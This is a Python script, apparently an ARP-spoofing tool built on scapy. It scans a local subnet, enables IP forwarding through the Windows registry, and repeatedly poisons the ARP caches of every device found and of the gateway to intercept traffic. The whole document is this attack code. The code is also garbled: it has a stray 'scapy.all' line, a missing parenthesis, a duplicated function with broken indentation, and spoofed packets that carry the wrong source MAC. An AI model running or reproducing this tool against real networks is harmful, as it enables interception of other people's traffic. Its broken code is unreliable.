from scapy.all import ARP, send, srp, Ether

import time

import sys

import winreg

import ctypes





print(".")





def enable_ip_forwarding_windows():

    try:

        # Open the registry key

        path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"

        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_SET_VALUE)

        winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)

        winreg.CloseKey(key)



        print("[+] IP forwarding enabled in registry. A reboot or service restart may be required.")



    except PermissionError:

        print("[!] Permission denied. Run this script as administrator.")

    except Exception as e:

        print(f"[!] An error occurred: {e}")



def enable_ip_forwarding_linux():

    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:

        f.write("1")



def get_mac(ip):

    arp_request = ARP(pdst=ip)

    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast / arp_request





    answered = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered:



        return answered[0][1].hwsrc

    return None



def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)

    spoof_mac = get_mac(spoof_ip)

    if target_mac and spoof_mac:

        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)

        ether = Ether(dst=target_mac, src=spoof_mac)

        packet = ether / arp_response

        send(packet, verbose=False)

    else:

        print(f"[!] Could not resolve MAC for {target_ip} or {spoof_ip}. Skipping.")



def scan_network(network_range):
scapy.all
    arp_request = ARP(pdst=network_range)

    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast / arp_request

    answered, _ = srp(arp_request_broadcast, timeout=2, verbose=False)

    

    devices = []

    for response in answered:

        devices.append(response[1].psrc

    return devices





def start_arp_spoofing(gateway_ip, network_range):

    print(f"Scanning network {network_range} for devices...")

    devices = scan_network(network_range)

    print(f"Found {len(devices)} devices. Starting ARP spoofing...")



    try:

        while True:

            for device_ip in devices:

                spoof(device_ip, gateway_ip)  

                spoof(gateway_ip, device_ip)          

    time.sleep(2)

    except KeyboardInterrupt:

        print("\nStopping ARP spoofing... Restoring ARP tables.")

        restore_arp(gateway_ip, devices)

        

def start_arp_spoofing(gateway_ip, network_range):

    print(f"Scanning network {network_range} for devices...")

    devices = scan_network(network_range)

    print(f"Found {len(devices)} devices. Starting ARP spoofing...")



    try:

        while True:

            for device_ip in devices:

                spoof(device_ip, gateway_ip)  

                spoof(gateway_ip, device_ip)            time.sleep(2)

    except KeyboardInterrupt:

        print("\nStopping ARP spoofing... Restoring ARP tables.")

        restore_arp(gateway_ip, devices)



def restore_arp(gateway_ip, devices):

    gateway_mac = get_mac(gateway_ip)

    for device_ip in devices:

        device_mac = get_mac(device_ip)

        if device_mac:

            arp_restore = ARP(op=2, pdst=device_ip, hwdst=device_mac, psrc=gateway_ip, hwsrc=gateway_mac)

            send(arp_restore, count=3, verbose=False)

    print("ARP tables restored.")



if __name__ == "__main__":

    

    gateway_ip = "192.168.14.198"  

    network_range = "192.168.14.198/24"  





    print("Enabling IP forwarding...")

    enable_ip_forwarding_windows()

    #enable_ip_forwarding_linux()

    start_arp_spoofing(gateway_ip, network_range)




